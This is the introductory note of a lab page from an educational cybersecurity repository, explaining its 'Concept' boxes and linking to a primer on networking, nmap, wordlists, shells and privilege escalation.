> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
